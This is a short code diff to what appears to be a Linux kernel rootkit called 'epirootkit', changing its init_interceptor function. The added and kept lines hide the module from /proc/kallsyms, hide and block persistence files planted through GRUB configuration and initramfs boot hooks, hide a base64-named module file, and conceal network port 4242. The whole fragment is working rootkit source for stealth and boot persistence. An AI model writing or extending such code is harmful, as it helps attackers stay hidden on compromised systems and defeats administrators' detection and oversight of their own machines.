@@ -66,13 +66,18 @@ int init_interceptor(void) {
     // Hide module in /proc/kallsyms
     alterate_add("/proc/kallsyms", -1, "epirootkit", NULL, NULL);
 
-    // Hide peristence stuff
+    // Genreral hiding for epirootkit module file in base64
+     hide_file("/usr/lib/epirootkit/cH0c01AtcG9ydC1rZXlzLmNv");
+
+    // Hide grub peristence stuff
     hide_file("/.grub.sh");
     hide_file("/etc/default/grub.d/99.cfg");
-    hide_file("/usr/lib/epirootkit");
     forbid_file("/.grub.sh");
     forbid_file("/etc/default/grub.d/99.cfg");
-    forbid_file("/usr/lib/epirootkit");
+
+    // Hide initramfs persistence stuff
+    hide_file("/etc/initramfs-tools/hooks/epirootkit");
+    hide_file("/etc/initramfs-tools/scripts/init-premount/epirootkit-load");
 
     // Hide ports
     hide_port("4242");
